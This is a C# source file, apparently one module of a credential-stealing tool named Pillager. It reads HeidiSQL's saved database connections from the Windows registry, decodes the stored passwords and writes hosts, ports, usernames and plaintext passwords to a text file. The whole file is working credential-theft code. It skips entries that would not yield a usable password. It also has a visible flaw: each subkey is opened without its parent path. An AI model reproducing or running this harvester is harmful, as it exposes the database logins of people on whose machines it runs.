using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using static System.Net.Mime.MediaTypeNames;

namespace Pillager.Tools
{
    internal class HeidiSQL : ICommand
    {
        Dictionary<int, string> service_types = new Dictionary<int, string>(){
            {0, "mysql"},
            {1, "mysql-named-pipe"},
            {2, "mysql-ssh"},
            {3, "mssql-named-pipe"},
            {4, "mssql"},
            {5, "mssql-spx-ipx"},
            {6, "mssql-banyan-vines"},
            {7, "mssql-windows-rpc"},
            {8, "postgres"},
        };

        public string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string registry = @"Software\HeidiSQL\Servers";
            var registryKey = Registry.CurrentUser.OpenSubKey(registry);
            if (registryKey != null)
            {
                foreach (var subKeyName in registryKey.GetSubKeyNames())
                {
                    var subKey = Registry.CurrentUser.OpenSubKey(subKeyName);
                    string site_key = subKeyName;
                    string host = subKey.GetValue("Host","").ToString();
                    string user = subKey.GetValue("User", "").ToString();
                    string port = subKey.GetValue("Port", "").ToString();
                    int db_type = (int)subKey.GetValue("NetType", 0);
                    int prompt = (int)subKey.GetValue("LoginPrompt", 0);
                    int win_auth = (int)subKey.GetValue("WindowsAuth", 0);
                    string epass = (string)subKey.GetValue("Password", "");

                    if (db_type > 3 && db_type < 7 && win_auth == 1) continue;
                    if (string.IsNullOrEmpty(epass)|| epass.Length==1|| prompt==1) continue;
                    string pass = Decrypt(epass);
                    sb.AppendLine($"Service: {service_types[db_type]}");
                    sb.AppendLine($"Host: {host}");
                    sb.AppendLine($"Port: {port}");
                    sb.AppendLine($"User: {user}");
                    sb.AppendLine($"Password: {pass}");
                    sb.AppendLine();
                }
            }
            return sb.ToString();
        }

        private string Decrypt(string input)
        {
            try
            {
                int py = Convert.ToInt32(input.Skip(input.Length - 1).Take(1).ToArray()[0].ToString());
                input = input.Remove(input.Length - 1, 1);
                byte[] t = HexToByte(input);
                for (int i = 0; i < t.Length; i++)
                {
                    t[i] = (byte)(t[i] - py);
                }
                return Encoding.UTF8.GetString(t);
            }
            catch { return ""; }
        }

        public static byte[] HexToByte(string msg)
        {
            byte[] comBuffer = new byte[msg.Length / 2];
            for (int i = 0; i < msg.Length; i += 2)
            {
                comBuffer[i / 2] = (byte)Convert.ToByte(msg.Substring(i, 2), 16);
            }
            return comBuffer;
        }

        public override void Save(string path)
        {
            try
            {
                string output = GetInfo();
                if (!string.IsNullOrEmpty(output))
                {
                    string savepath = Path.Combine(path, "HeidiSQL");
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "HeidiSQL.txt"), output, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}
